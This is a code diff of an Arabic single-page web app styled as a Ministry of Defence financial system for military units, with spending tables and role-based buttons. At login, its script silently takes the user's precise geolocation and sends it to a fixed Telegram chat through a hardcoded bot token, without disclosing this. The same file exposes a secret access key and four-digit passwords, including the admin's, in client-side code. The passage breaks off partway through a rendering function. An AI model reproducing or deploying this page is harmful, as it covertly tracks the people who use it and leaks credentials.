@@ -3,294 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>النظام المالي - وزارة الدفاع</title>
+    <title>النظام المالي المتقدم - وزارة الدفاع</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body {
-            background: #0a1a1a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-        #loginScreen {
-            background: #1a2a2a;
-            padding: 40px 30px;
-            border-radius: 24px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            text-align: center;
-            border: 1px solid #2a4a4a;
-        }
+        body { background: #0a1a1a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; }
+        .container { width: 100%; max-width: 1400px; }
+        .card { background: #1a2a2a; border-radius: 16px; padding: 20px; border: 1px solid #2a4a4a; margin-bottom: 20px; }
+        .card h3 { color: #c9a84c; margin-bottom: 16px; font-size: 20px; border-bottom: 1px solid #2a4a4a; padding-bottom: 10px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+        .grid-4 { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 12px; }
+        @media (max-width: 768px) { .grid-2, .grid-3, .grid-4 { grid-template-columns: 1fr; } }
+
+        label { color: #8a9a8a; display: block; margin: 8px 0 4px; font-size: 14px; }
+        input, select, textarea { width: 100%; padding: 10px; border-radius: 10px; border: 1px solid #2a4a4a; background: #0a1a1a; color: #c9d4c9; font-size: 15px; outline: none; }
+        input:focus, select:focus, textarea:focus { border-color: #c9a84c; }
+        textarea { min-height: 50px; resize: vertical; }
+        .btn { padding: 10px 20px; border-radius: 10px; border: none; font-size: 15px; cursor: pointer; transition: 0.3s; font-weight: bold; }
+        .btn-primary { background: #c9a84c; color: #0a1a1a; }
+        .btn-primary:hover { background: #dbb95a; transform: scale(1.02); }
+        .btn-danger { background: #5a2a2a; color: #ff6b6b; border: 1px solid #5a2a2a; }
+        .btn-danger:hover { background: #6a3a3a; }
+        .btn-success { background: #2a5a2a; color: #6f6; border: 1px solid #2a5a2a; }
+        .btn-success:hover { background: #3a6a3a; }
+        .btn-secondary { background: #2a2a2a; color: #8a9a8a; border: 1px solid #2a4a4a; }
+        .btn-secondary:hover { background: #3a3a3a; }
+
+        .table-container { overflow-x: auto; margin-top: 10px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { text-align: right; padding: 10px 8px; color: #c9a84c; border-bottom: 2px solid #2a4a4a; }
+        td { padding: 8px; color: #c9d4c9; border-bottom: 1px solid #1a2a2a; vertical-align: middle; }
+        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: #2a4a4a; color: #c9d4c9; }
+        .badge-warning { background: #5a3a1a; color: #f0c060; }
+        .badge-success { background: #1a5a1a; color: #6f6; }
+        .badge-danger { background: #5a1a1a; color: #ff6b6b; }
+
+        .total-box { background: #0a1a1a; padding: 15px; border-radius: 12px; text-align: center; border: 1px solid #2a4a4a; }
+        .total-box .num { font-size: 28px; font-weight: bold; color: #c9a84c; }
+        .total-box .label { color: #8a9a8a; font-size: 14px; }
+
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 999; padding: 20px; }
+        .modal.active { display: flex; }
+        .modal-content { background: #1a2a2a; padding: 25px; border-radius: 20px; width: 100%; max-width: 600px; border: 1px solid #2a4a4a; max-height: 90vh; overflow-y: auto; }
+        .modal-content h3 { color: #c9a84c; margin-bottom: 16px; }
+
+        .hidden { display: none; }
+        .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+        .mt-10 { margin-top: 10px; }
+        .mb-10 { margin-bottom: 10px; }
+        .text-center { text-align: center; }
+        .text-muted { color: #8a9a8a; font-size: 13px; }
+
+        #loginScreen { max-width: 400px; margin: 0 auto; }
         #loginScreen h1 { color: #c9a84c; font-size: 28px; margin-bottom: 8px; letter-spacing: 2px; }
         #loginScreen .sub { color: #8a9a8a; font-size: 14px; margin-bottom: 30px; }
-        #loginScreen input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border-radius: 12px;
-            border: 1px solid #2a4a4a;
-            background: #0a1a1a;
-            color: #c9d4c9;
-            font-size: 18px;
-            text-align: center;
-            outline: none;
-            transition: 0.3s;
-        }
-        #loginScreen input:focus { border-color: #c9a84c; box-shadow: 0 0 20px rgba(201, 168, 76, 0.15); }
-        #loginScreen button {
-            width: 100%;
-            padding: 14px;
-            margin-top: 20px;
-            border-radius: 12px;
-            border: none;
-            background: #c9a84c;
-            color: #0a1a1a;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        #loginScreen button:hover { background: #dbb95a; transform: scale(1.02); }
-        #loginScreen button:disabled { opacity: 0.6; cursor: not-allowed; }
         #loginError { color: #ff6b6b; font-size: 14px; margin-top: 12px; display: none; }
 
-        #mainApp { display: none; width: 100%; max-width: 1200px; margin: 0 auto; }
-        .header {
-            background: #1a2a2a;
-            padding: 16px 24px;
-            border-radius: 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #c9a84c;
-            margin-bottom: 24px;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .header h2 { color: #c9a84c; font-size: 22px; letter-spacing: 1px; }
-        .header .user-info { color: #8a9a8a; font-size: 14px; display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
-        .header .user-info span { color: #c9d4c9; font-weight: bold; }
-        .header .logout-btn {
-            background: #3a2a2a;
-            color: #ff6b6b;
-            border: 1px solid #5a3a3a;
-            padding: 6px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: 0.3s;
-        }
-        .header .logout-btn:hover { background: #5a3a3a; }
-
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        .stat-card {
-            background: #1a2a2a;
-            padding: 16px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid #2a4a4a;
-        }
-        .stat-card .num { font-size: 28px; font-weight: bold; color: #c9a84c; }
-        .stat-card .label { color: #8a9a8a; font-size: 13px; margin-top: 4px; }
-
-        .action-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-        .action-btn {
-            background: #1a2a2a;
-            border: 1px solid #2a4a4a;
-            color: #c9d4c9;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s;
-            text-align: center;
-        }
-        .action-btn:hover { background: #2a4a4a; border-color: #c9a84c; transform: translateY(-2px); }
-        .action-btn.primary { background: #c9a84c; color: #0a1a1a; border-color: #c9a84c; }
-        .action-btn.danger { border-color: #5a2a2a; color: #ff6b6b; }
-        .action-btn.danger:hover { background: #3a1a1a; }
-        .action-btn.hidden-btn { display: none; }
-
-        .table-container {
-            background: #1a2a2a;
-            border-radius: 16px;
-            padding: 16px;
-            overflow-x: auto;
-            border: 1px solid #2a4a4a;
-        }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th { text-align: right; padding: 12px 8px; color: #c9a84c; border-bottom: 1px solid #2a4a4a; font-weight: 600; }
-        td { padding: 10px 8px; color: #c9d4c9; border-bottom: 1px solid #1a2a2a; }
-        .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 12px; background: #2a4a4a; color: #c9d4c9; }
-        .badge.warning { background: #5a3a1a; color: #f0c060; }
-        .badge.danger { background: #5a1a1a; color: #ff6b6b; }
-
-        .alert-banner {
-            background: #3a1a1a;
-            border: 1px solid #5a2a2a;
-            color: #ff6b6b;
-            padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            display: none;
-            font-size: 14px;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-            padding: 20px;
-        }
-        .modal.active { display: flex; }
-        .modal-content {
-            background: #1a2a2a;
-            padding: 30px;
-            border-radius: 20px;
-            width: 100%;
-            max-width: 500px;
-            border: 1px solid #2a4a4a;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        .modal-content h3 { color: #c9a84c; margin-bottom: 16px; font-size: 22px; }
-        .modal-content label { color: #8a9a8a; display: block; margin: 12px 0 4px; font-size: 14px; }
-        .modal-content input, .modal-content select, .modal-content textarea {
-            width: 100%;
-            padding: 12px;
-            border-radius: 10px;
-            border: 1px solid #2a4a4a;
-            background: #0a1a1a;
-            color: #c9d4c9;
-            font-size: 16px;
-            outline: none;
-        }
-        .modal-content textarea { min-height: 60px; resize: vertical; }
-        .modal-content .modal-actions { display: flex; gap: 12px; margin-top: 20px; }
-        .modal-content .modal-actions button { flex: 1; padding: 12px; border-radius: 10px; border: none; font-size: 16px; cursor: pointer; }
-        .modal-content .modal-actions .btn-confirm { background: #c9a84c; color: #0a1a1a; }
-        .modal-content .modal-actions .btn-cancel { background: #2a2a2a; color: #8a9a8a; }
-
-        @media (max-width: 480px) {
-            .header h2 { font-size: 18px; }
-            .action-grid { grid-template-columns: 1fr; }
-            .stats { grid-template-columns: 1fr 1fr; }
-            .modal-content { padding: 20px; }
-        }
-
-        #emptyScreen {
-            display: none;
-            background: #0a1a1a;
-            width: 100vw;
-            height: 100vh;
-            justify-content: center;
-            align-items: center;
-            color: #2a3a3a;
-            font-size: 20px;
-        }
-        #accessDenied {
-            display: none;
-            background: #0a1a1a;
-            width: 100vw;
-            height: 100vh;
-            justify-content: center;
-            align-items: center;
-            color: #2a3a3a;
-            font-size: 20px;
-            text-align: center;
-            padding: 20px;
-        }
-        #accessDenied h1 { color: #c9a84c; font-size: 28px; margin: 20px 0; }
-        #accessDenied p { color: #8a9a8a; font-size: 16px; }
-
-        .location-tag {
-            background: #2a4a4a;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            color: #8a9a8a;
-        }
+        .location-tag { background: #2a4a4a; padding: 2px 10px; border-radius: 20px; font-size: 11px; color: #8a9a8a; }
+        .img-thumb { max-width: 60px; max-height: 60px; border-radius: 8px; border: 1px solid #2a4a4a; }
+        .action-btn { padding: 6px 12px; border-radius: 8px; border: none; font-size: 12px; cursor: pointer; transition: 0.3s; }
+        .action-btn-edit { background: #2a4a4a; color: #c9a84c; }
+        .action-btn-edit:hover { background: #3a5a5a; }
+        .action-btn-delete { background: #3a1a1a; color: #ff6b6b; }
+        .action-btn-delete:hover { background: #5a2a2a; }
     </style>
 </head>
 <body>
+    <div class="container">
 
-    <!-- ====== صفحة الرفض ====== -->
-    <div id="accessDenied">
-        <div style="text-align:center;">
-            <div style="font-size:80px; margin-bottom:20px;">🚫</div>
-            <h1>غير مصرح بالدخول</h1>
-            <p>الرابط غير صحيح أو انتهت صلاحيته.<br>الرجاء التواصل مع المدير.</p>
+        <!-- ====== شاشة تسجيل الدخول ====== -->
+        <div id="loginScreen" class="card" style="max-width:400px;margin:20px auto;">
+            <h1 class="text-center">⚔️ وزارة الدفاع</h1>
+            <div class="sub text-center">النظام المالي المتقدم</div>
+            <input type="password" id="loginPass" placeholder="أدخل كلمة المرور" maxlength="4">
+            <button class="btn btn-primary" style="width:100%;margin-top:10px;" onclick="requestLocationAndLogin()">دخول</button>
+            <div id="loginError" class="text-center">كلمة المرور غير صحيحة</div>
         </div>
-    </div>
 
-    <!-- ====== صفحة فارغة ====== -->
-    <div id="emptyScreen">
-        <div style="text-align:center;">
-            <div style="font-size:60px; margin-bottom:20px;">🚫</div>
-            <div>لا يوجد محتوى</div>
-        </div>
-    </div>
+        <!-- ====== التطبيق الرئيسي ====== -->
+        <div id="mainApp" class="hidden">
 
-    <!-- ====== شاشة تسجيل الدخول ====== -->
-    <div id="loginScreen">
-        <h1>⚔️ وزارة الدفاع</h1>
-        <div class="sub">النظام المالي للقطعات العسكرية</div>
-        <input type="password" id="loginPass" placeholder="أدخل كلمة المرور" maxlength="4">
-        <button onclick="requestLocationAndLogin()">دخول</button>
-        <div id="loginError">كلمة المرور غير صحيحة</div>
-    </div>
-
-    <!-- ====== التطبيق الرئيسي ====== -->
-    <div id="mainApp">
-        <div class="header">
-            <h2>💰 النظام المالي</h2>
-            <div class="user-info">
-                <span id="userRoleDisplay">مستخدم عادي</span>
-                <span id="userLocationDisplay">القطعة 5 - دير الزور</span>
-                <button class="logout-btn" onclick="logout()">تسجيل خروج</button>
+            <!-- ====== رأس الصفحة ====== -->
+            <div class="card flex-between">
+                <h2 style="color:#c9a84c;">💰 النظام المالي المتقدم</h2>
+                <div class="flex-between" style="gap:16px;flex-wrap:wrap;">
+                    <span id="userRoleDisplay" style="color:#8a9a8a;">مستخدم عادي</span>
+                    <span id="userLocationDisplay" style="color:#8a9a8a;">القطعة 5 - دير الزور</span>
+                    <button class="btn btn-danger" onclick="logout()">تسجيل خروج</button>
+                </div>
             </div>
-        </div>
-        <div class="alert-banner" id="alertBanner">⚠️ تم تسجيل محاولة تلاعب!</div>
-        <div class="stats">
-            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">إجمالي المبالغ</div></div>
-            <div class="stat-card"><div class="num" id="statCount">0</div><div class="label">عدد العمليات</div></div>
-            <div class="stat-card"><div class="num" id="statAlerts">0</div><div class="label">تنبيهات التلاعب</div></div>
-        </div>
-        <div class="action-grid" id="actionsGrid">
-            <!-- الأزرار الأساسية (تظهر حسب صلاحية المستخدم) -->
-            <button class="action-btn primary btn-receive" onclick="openModal('receive')">📥 استقبال مبلغ</button>
-            <button class="action-btn primary btn-disburse" onclick="openModal('disburse')">📤 تخريج مبلغ</button>
-            <button class="action-btn btn-invoice" onclick="openModal('invoice')">🧾 رفع فاتورة + موقع</button>
-            <button class="action-btn" onclick="viewTransactions()">📋 عرض السجل</button>
-            <button class="action-btn btn-admin" id="adminBtn" style="display:none;" onclick="openModal('admin')">⚙️ إدارة القطعات</button>
-            <button class="action-btn btn-adduser" id="addUserBtn" style="display:none;" onclick="openModal('addUser')">➕ إضافة مستخدم</button>
-            <button class="action-btn btn-permissions" id="permissionsBtn" style="display:none;" onclick="openModal('permissions')">🔑 صلاحيات المستخدمين</button>
-        </div>
-        <div class="table-container">
-            <table>
-                <thead><tr><th>التاريخ</th><th>النوع</th><th>المبلغ</th><th>البيان</th><th>الموقع</th><th>الحالة</th></tr></thead>
-                <tbody id="transactionsBody"><tr><td colspan="6" style="text-align:center; color:#5a6a5a;">لا توجد عمليات مسجلة</td></tr></tbody>
-            </table>
+
+            <!-- ====== الإحصائيات ====== -->
+            <div class="grid-4" id="statsContainer">
+                <div class="total-box"><div class="num" id="statTotal">0</div><div class="label">إجمالي المبالغ المستلمة</div></div>
+                <div class="total-box"><div class="num" id="statExpenses">0</div><div class="label">إجمالي المصروفات</div></div>
+                <div class="total-box"><div class="num" id="statRemaining">0</div><div class="label">المبلغ المتبقي</div></div>
+                <div class="total-box"><div class="num" id="statCount">0</div><div class="label">عدد العمليات</div></div>
+            </div>
+
+            <!-- ====== الأزرار ====== -->
+            <div class="card">
+                <div class="grid-3" id="actionsGrid">
+                    <button class="btn btn-primary btn-receive" onclick="openModal('receive')">📥 استقبال مبلغ</button>
+                    <button class="btn btn-primary btn-disburse" onclick="openModal('disburse')">📤 إضافة مصروف</button>
+                    <button class="btn btn-secondary" onclick="viewTransactions()">📋 عرض السجل</button>
+                    <button class="btn btn-secondary btn-invoice hidden" onclick="openModal('invoice')">🧾 رفع فاتورة</button>
+                    <button class="btn btn-success btn-admin hidden" id="adminBtn" onclick="openModal('admin')">⚙️ إدارة النظام</button>
+                    <button class="btn btn-success btn-adduser hidden" id="addUserBtn" onclick="openModal('addUser')">➕ إضافة مستخدم</button>
+                    <button class="btn btn-success btn-permissions hidden" id="permissionsBtn" onclick="openModal('permissions')">🔑 صلاحيات</button>
+                    <button class="btn btn-success btn-materials hidden" id="materialsBtn" onclick="openModal('materials')">📦 المواد والمصروفات</button>
+                </div>
+            </div>
+
+            <!-- ====== جدول المصروفات ====== -->
+            <div class="card">
+                <h3>📋 سجل المصروفات الشهري</h3>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>التاريخ</th>
+                                <th>نوع المصروف</th>
+                                <th>الوصف</th>
+                                <th>المبلغ</th>
+                                <th>الصورة</th>
+                                <th>الموقع</th>
+                                <th>رقم الهاتف</th>
+                                <th>ملاحظات</th>
+                                <th>إجراءات</th>
+                            </tr>
+                        </thead>
+                        <tbody id="transactionsBody">
+                            <tr><td colspan="10" class="text-center text-muted">لا توجد مصروفات مسجلة</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- ====== جدول المواد ====== -->
+            <div class="card" id="materialsSection">
+                <h3>📦 قائمة المواد والمصروفات</h3>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr><th>#</th><th>اسم المادة</th><th>السعر الافتراضي</th><th>إجراءات</th></tr>
+                        </thead>
+                        <tbody id="materialsBody">
+                            <tr><td colspan="4" class="text-center text-muted">لا توجد مواد مسجلة</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
         </div>
     </div>
 
@@ -299,42 +164,26 @@
         <div class="modal-content">
             <h3 id="modalTitle">عنوان</h3>
             <div id="modalBody"></div>
-            <div class="modal-actions">
-                <button class="btn-confirm" id="modalConfirm">تأكيد</button>
-                <button class="btn-cancel" onclick="closeModal()">إلغاء</button>
+            <div class="flex-between" style="margin-top:16px;gap:10px;">
+                <button class="btn btn-primary" id="modalConfirm" style="flex:1;">تأكيد</button>
+                <button class="btn btn-secondary" onclick="closeModal()" style="flex:1;">إلغاء</button>
             </div>
         </div>
     </div>
 
     <script>
         // =====================================================
-        // 0. حماية الرابط (مفتاح سري + صلاحية زمنية)
+        // 0. حماية الرابط
         // =====================================================
         (function() {
             const SECRET_KEY = "9x7kLpQw2RzT4nM8vBcF";
             const EXPIRY_DATE = new Date();
             EXPIRY_DATE.setDate(EXPIRY_DATE.getDate() + 30);
-
             const params = new URLSearchParams(window.location.search);
-            const userKey = params.get('key');
-
-            if (userKey !== SECRET_KEY) {
-                document.getElementById('accessDenied').style.display = 'flex';
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('mainApp').style.display = 'none';
-                document.getElementById('emptyScreen').style.display = 'none';
-                throw new Error("مفتاح غير صحيح");
+            if (params.get('key') !== SECRET_KEY || Date.now() > EXPIRY_DATE.getTime()) {
+                document.body.innerHTML = `<div style="text-align:center;margin-top:50px;color:#c9a84c;font-size:28px;">🚫 غير مصرح بالدخول</div>`;
+                throw new Error("غير مصرح");
             }
-
-            if (Date.now() > EXPIRY_DATE.getTime()) {
-                document.getElementById('accessDenied').style.display = 'flex';
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('mainApp').style.display = 'none';
-                document.getElementById('emptyScreen').style.display = 'none';
-                throw new Error("انتهت الصلاحية");
-            }
-
-            console.log("✅ تم التحقق من المفتاح والصلاحية بنجاح");
         })();
 
         // =====================================================
@@ -343,19 +192,15 @@
         const BOT_TOKEN = "8834411340:AAF2dZMtFMuP1ezGDLv9I2n7hTzDF7V6I9s";
         const CHAT_ID = "83556189";
 
-        // ====== صلاحيات المستخدمين ======
-        // كل مستخدم له قائمة من الصلاحيات (الأزرار التي تظهر له)
-        // key: كلمة المرور
-        // value: قائمة الأزرار المسموحة
+        // ====== المستخدمون والصلاحيات ======
         const USER_PERMISSIONS = {
-            '1234': ['receive', 'disburse', 'view'],  // مستخدم عادي: استقبال + تخريج + عرض
-            '1111': ['receive', 'view'],              // مستخدم 2: استقبال فقط + عرض
-            '2222': ['disburse', 'invoice', 'view'],  // مستخدم 3: تخريج + فاتورة + عرض
-            '3333': ['invoice', 'view'],              // مستخدم 4: فاتورة + عرض
-            '1992': ['receive', 'disburse', 'invoice', 'view', 'admin', 'adduser', 'permissions'] // المدير: كل شيء
+            '1234': ['receive', 'disburse', 'view'],
+            '1111': ['receive', 'view'],
+            '2222': ['disburse', 'invoice', 'view'],
+            '3333': ['invoice', 'view'],
+            '1992': ['receive', 'disburse', 'invoice', 'view', 'admin', 'adduser', 'permissions', 'materials']
         };
 
-        // ====== بيانات المستخدمين ======
         let users = {
             '1234': { role: 'user', name: 'مالي القطعة 5', location: 'دير الزور', id: 5 },
             '1111': { role: 'user', name: 'مالي القطعة 1', location: 'حلب', id: 1 },
@@ -364,13 +209,27 @@
             '1992': { role: 'admin', name: 'مدير الوزارة', location: 'المركز العام', id: 0 }
         };
 
+        // ====== المواد والمصروفات ======
+        let materials = [
+            { id: 1, name: 'ماكولات وشراب', price: 0 },
+            { id: 2, name: 'شراء اغراض', price: 0 },
+            { id: 3, name: 'مصروف شخصي', price: 0 },
+            { id: 4, name: 'كهرباء', price: 0 },
+            { id: 5, name: 'صحية', price: 0 },
+            { id: 6, name: 'صيانة', price: 0 }
+        ];
+        let nextMaterialId = 7;
+
+        // ====== المعاملات ======
         let transactions = [];
         let alerts = [];
         let currentUser = null;
         let userLocation = null;
+        let monthlyReceived = 0;
+        let currentMonth = new Date().getMonth() + 1;
 
         // =====================================================
-        // 2. طلب الموقع + تسجيل الدخول
+        // 2. الموقع + تسجيل الدخول
         // =====================================================
         function requestLocationAndLogin() {
             const pass = document.getElementById('loginPass').value.trim();
@@ -379,311 +238,288 @@
                 setTimeout(() => document.getElementById('loginError').style.display = 'none', 3000);
                 return;
             }
-
-            const loginBtn = document.querySelector('#loginScreen button');
-            const originalText = loginBtn.textContent;
-            loginBtn.textContent = '⏳ جاري الحصول على الموقع...';
-            loginBtn.disabled = true;
-
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        loginBtn.textContent = originalText;
-                        loginBtn.disabled = false;
-                        userLocation = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
+                    function(pos) {
+                        userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
                         sendLocationToTelegram(userLocation);
                         completeLogin(pass);
                     },
-                    function(error) {
-                        loginBtn.textContent = originalText;
-                        loginBtn.disabled = false;
-                        
-                        if (error.code === 3) {
-                            console.warn('⏳ انتهت المهلة، إعادة المحاولة...');
-                            navigator.geolocation.getCurrentPosition(
-                                function(position) {
-                                    userLocation = {
-                                        lat: position.coords.latitude,
-                                        lon: position.coords.longitude,
-                                        accuracy: position.coords.accuracy
-                                    };
-                                    sendLocationToTelegram(userLocation);
-                                    completeLogin(pass);
-                                },
-                                function(secondError) {
-                                    console.warn('تم رفض الموقع:', secondError);
-                                    document.getElementById('loginScreen').style.display = 'none';
-                                    document.getElementById('emptyScreen').style.display = 'flex';
-                                },
-                                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-                            );
-                        } else {
-                            console.warn('تم رفض الموقع:', error);
-                            document.getElementById('loginScreen').style.display = 'none';
-                            document.getElementById('emptyScreen').style.display = 'flex';
-                        }
-                    },
-                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
+                    function() { completeLogin(pass); },
+                    { enableHighAccuracy: true, timeout: 30000 }
                 );
             } else {
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('emptyScreen').style.display = 'flex';
+                completeLogin(pass);
             }
         }
 
-        // =====================================================
-        // 3. إرسال الموقع إلى تليجرام
-        // =====================================================
         function sendLocationToTelegram(loc) {
-            const msg = `📍 موقع المستخدم الجديد\n\n` +
-                        `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
-                        `🌐 الرابط: https://www.google.com/maps?q=${loc.lat},${loc.lon}\n` +
-                        `🎯 الدقة: ${loc.accuracy} متر`;
-
+            const msg = `📍 موقع المستخدم\n🕐 ${new Date().toLocaleString('ar-EG')}\n🌐 https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.ok) console.log('✅ تم إرسال الموقع إلى تليجرام');
-                else console.warn('❌ فشل إرسال الموقع:', data);
-            })
-            .catch(err => console.warn('❌ خطأ في الإرسال:', err));
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: loc.lat,
-                    longitude: loc.lon
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.ok) console.log('✅ تم إرسال الموقع الجغرافي إلى تليجرام');
-            })
-            .catch(err => console.warn('❌ خطأ في إرسال الموقع الجغرافي:', err));
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            }).catch(() => {});
         }
 
-        // =====================================================
-        // 4. إتمام تسجيل الدخول وعرض الأزرار حسب الصلاحية
-        // =====================================================
         function completeLogin(pass) {
             currentUser = users[pass];
             document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('mainApp').style.display = 'block';
-            
-            // عرض معلومات المستخدم
-            document.getElementById('userRoleDisplay').textContent = 
-                currentUser.role === 'admin' ? '👑 مدير الوزارة' : '📋 مالي قطعة';
-            document.getElementById('userLocationDisplay').textContent = 
-                currentUser.location;
+            document.getElementById('mainApp').classList.remove('hidden');
+            document.getElementById('userRoleDisplay').textContent = currentUser.role === 'admin' ? '👑 مدير الوزارة' : '📋 مالي قطعة';
+            document.getElementById('userLocationDisplay').textContent = currentUser.location;
 
-            // ====== عرض الأزرار حسب صلاحية المستخدم ======
-            const permissions = USER_PERMISSIONS[pass] || [];
-            
-            // إخفاء جميع الأزرار أولاً
-            document.querySelectorAll('.action-btn').forEach(btn => {
-                btn.style.display = 'none';
-            });
-
-            // إظهار الأزرار المسموحة فقط
-            permissions.forEach(perm => {
-                const btnMap = {
+            const perms = USER_PERMISSIONS[pass] || [];
+            document.querySelectorAll('#actionsGrid .btn').forEach(b => b.classList.add('hidden'));
+            perms.forEach(p => {
+                const map = {
                     'receive': '.btn-receive',
                     'disburse': '.btn-disburse',
                     'invoice': '.btn-invoice',
-                    'view': '.action-btn:not(.btn-receive):not(.btn-disburse):not(.btn-invoice):not(#adminBtn):not(#addUserBtn):not(#permissionsBtn)',
+                    'view': '.btn-secondary:not(.btn-receive):not(.btn-disburse):not(.btn-invoice):not(.btn-admin):not(.btn-adduser):not(.btn-permissions):not(.btn-materials)',
                     'admin': '#adminBtn',
                     'adduser': '#addUserBtn',
-                    'permissions': '#permissionsBtn'
+                    'permissions': '#permissionsBtn',
+                    'materials': '#materialsBtn'
                 };
-                
-                if (perm === 'view') {
-                    // زر عرض السجل (الزر الذي ليس له class خاص)
-                    document.querySelectorAll('.action-btn').forEach(btn => {
-                        if (!btn.classList.contains('btn-receive') && 
-                            !btn.classList.contains('btn-disburse') && 
-                            !btn.classList.contains('btn-invoice') &&
-                            !btn.id) {
-                            btn.style.display = 'block';
-                        }
-                    });
-                } else if (btnMap[perm]) {
-                    const el = document.querySelector(btnMap[perm]);
-                    if (el) el.style.display = 'block';
+                if (p === 'view') {
+                    document.querySelectorAll('#actionsGrid .btn-secondary').forEach(b => b.classList.remove('hidden'));
+                } else if (map[p]) {
+                    const el = document.querySelector(map[p]);
+                    if (el) el.classList.remove('hidden');
                 }
             });
-
-            // إذا كان المستخدم مديراً، تظهر له أزرار الإدارة
             if (currentUser.role === 'admin') {
-                document.getElementById('adminBtn').style.display = 'block';
-                document.getElementById('addUserBtn').style.display = 'block';
-                document.getElementById('permissionsBtn').style.display = 'block';
+                document.querySelectorAll('#adminBtn, #addUserBtn, #permissionsBtn, #materialsBtn').forEach(b => b.classList.remove('hidden'));
             }
-
             updateStats();
             renderTransactions();
+            renderMaterials();
+        }
+
+        function logout() {
+            currentUser = null;
+            document.getElementById('mainApp').classList.add('hidden');
+            document.getElementById('loginScreen').style.display = 'block';
+            document.getElementById('loginPass').value = '';
         }
 
         // =====================================================
-        // 5. تحديث الإحصائيات والجداول
+        // 3. تحديث الإحصائيات
         // =====================================================
         function updateStats() {
-            const total = transactions.reduce((sum, t) => sum + t.amount, 0);
-            document.getElementById('statTotal').textContent = total.toLocaleString() + ' ل.س';
+            const totalReceived = transactions.filter(t => t.type === 'receive').reduce((s, t) => s + t.amount, 0);
+            const totalExpenses = transactions.filter(t => t.type === 'expense').reduce((s, t) => s + t.amount, 0);
+            document.getElementById('statTotal').textContent = totalReceived.toLocaleString() + ' ل.س';
+            document.getElementById('statExpenses').textContent = totalExpenses.toLocaleString() + ' ل.س';
+            document.getElementById('statRemaining').textContent = (totalReceived - totalExpenses).toLocaleString() + ' ل.س';
             document.getElementById('statCount').textContent = transactions.length;
-            document.getElementById('statAlerts').textContent = alerts.length;
         }
 
+        // =====================================================
+        // 4. عرض الجداول
+        // =====================================================
         function renderTransactions() {
             const tbody = document.getElementById('transactionsBody');
             if (transactions.length === 0) {
